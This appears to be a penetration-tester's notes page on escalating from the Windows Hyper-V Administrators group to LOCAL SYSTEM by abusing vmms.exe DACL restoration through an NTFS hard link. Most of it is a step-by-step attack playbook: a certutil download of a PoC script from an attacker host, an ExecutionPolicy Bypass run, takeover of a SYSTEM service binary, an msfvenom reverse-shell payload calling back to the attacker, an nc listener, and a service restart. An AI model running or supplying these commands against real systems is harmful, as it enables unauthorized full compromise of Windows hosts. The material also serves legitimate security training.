---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "HYPER-V ADMINS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS SECURITY GROUPS|SECURITY GROUPS]]

#### *Theory*

Members of this group can manage *VMs ( Virtual Machines )* on a *Hyper-V* host, including operations such create, delete, start, stop and modify a given *VM*

Even though they do not belong to the *Administrators* group, this type of delegation is quite sensitive as most of the operations are carried out by the *vmms.exe ( Virtual Machines Management Service )*, which usually runs as *LOCAL SYSTEM*

---

#### *Enumeration*

##### *Listing the Groups to which the Current User belongs*

```bash
whoami /groups
net user <USER>
```

##### *Members of Hyper-V Admins*

```bash
net localgroup "Hyper-V Admins"
```

---

#### *Code Execution as LOCAL SYSTEM*

##### *Workflow*

In this case, we basically abuse a *DACL* restoration carried out by *vmms.exe*, which is running as *LOCAL SYSTEM*, when a *VM* is deleted

Bear in mind that whenever a *VM* is removed from the *Hyper-v* host, the *vmss.exe* steps in and perfoms a permissions restoration on the *VHDX* associated with the virtual machine in question

As stated, since this service is running as *LOCAL SYSTEM*, the action is carried out by the latter, so the restoration will most likely be carried out properly, and then we will have probably *FULL CONTROL* over the virtual disk

So, in order to abuse this behavior, we can proceed in the following way →

First, we create a new *VM* on the *Hyper-V* host by leveraging the existing rights of the controlled user account which belongs to the *Hyper-V administrators* group

During the *VM* creation, a *Virtual Hard Disk ( VHDX )* is also created and located on a system path specified by the operator

Right after, we remove the given *VHDX*  and create an *NTFS Hard Link*, named as the deleted *VHDX* and located in the same place, pointing to a sensitive resource that we want to compromise

The resource in question would be a binary of a service running as *LOCAL SYSTEM*

Once we delete the entire *VM* from the host, as we mentioned earlier, the *vmms.exe* service will carry out a *DACL* restoration over the *VHDX* resource associated with the *VM*

Since this *VHDX* is a *NTFS Hard Link* pointing to another resource, the virtualization service will restore the *DACL* of the given resource, namely the binary of a service running as *LOCAL SYSTEM*

Having *FULL CONTROL* over the sensitive binary, we can replace it with a malicious binary, then, we restart the service in question and the payload will be executed as *LOCAL SYSTEM*

##### *Requirements*

- ***The controlled user account must be a member of the Hyper-V administrators group***

- ***Hyper-V installed on the given host and VMMS.exe service running***

- ***The target must not be patched against this abuse technique***

> ***This vector was mitigated on March 2020 Windows Security Updates, which changed behavior related to hard links***

##### *Abuse - Windows*

###### *Checking groups to which the current user belongs*

```bash
whoami /groups
```

###### *Verifying if Hyper-V service is running*

```bash
Get-Service VMMS
```

###### *Looking for a service running as LOCAL SYSTEM*

```bash
Get-CimInstance win32_service -Filter 'StartName = "localsystem"' | Select Name, pathName
```

###### *Retrieving Information about the given service*

> ***CMD & PS***

```bash
sc.exe qc '<SERVICE_NAME>'
```

> ***PS***

```bash
Get-CimInstance -ClassName win32_service -Filter 'Name="<SERVICE_NAME>"' -Property *
```

###### *Checking the Service's current DACL*

> ***CMD & PS***

```bash
icacls '<BIN_PATH>'
```

> ***PS***

```bash
Get-ACL -Path '<BIN_PATH>' | Select -ExpandProperty accessToString
```

###### *PoC Setup*

- ***Downloading the script***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET 'https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1' --output - | sed 's@c:\\windows\\system32\\license.rtf@<BIN_PATH>@g' > hyperv-eop.ps1
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --location --request GET 'https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1' --output - | sed 's@c:\\windows\\system32\\license.rtf@C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe@g' > hyperv-eop.ps1
> ```
>

- ***Transferring it to the target***

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/hyperv-eop.ps1'
```

###### *Running the PoC*

> ***[PoC](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)***

This *PoC* performs the following steps for us →

- ***VM Creation***
- ***VHDX Deletion***
- ***NTFS Hard Link Creation to the specified resource***
- ***VM Deletion***

```bash
Powershell.exe -ExecutionPolicy Bypass -File .\hyperv-eop.ps1
```

###### *Taking Ownership of the binary service*

Right after the *VM* deletion, remember that *vmms.exe* will restore the *DACL* of the given resource, so we could proceed as follows to take ownership of the service's binary

```bash
takeown /f '<BINARY_PATH>'
```

###### *Taking FULL CONTROL over the binary service*

```bash
cmd.exe /c icacls '<BINARY_PATH>' /grant %USERNAME%:F
```

###### *Creating a malicious .EXE file*

> ***From the attacker*** ⚔️

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --arch x64 --platform windows --format exe --out <MALICIOUS_EXE>.exe
```

Then, we can transfer it to the target the same way we did it ***[[#PoC Setup|here]]***

###### *Replacing the legitimate binary with the malicious one*

- ***Backing up the legitimate binary***

```bash
cp '<BINARY_PATH>' 'C:\Windows\Temp\LPE\<BINARY>.bk'
```

- ***Binary Replacement***

```bash
cp 'C:\Windows\Temp\LPE\<MALICIOUS_EXE>.exe' '<BINARY_PATH>'
```

###### *Setting up a TCP Listener*

> ***From the attacker*** ⚔️

```bash
rlwrap -CaR nc -nlvp <PORT>
```

###### *Restarting the Target Service*

```bash
sc.exe stop <SERVICE>
sc.exe start <SERVICE>
```

---

#### *Resources*

***[Decoder: From Hyper-V Admin to System](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)***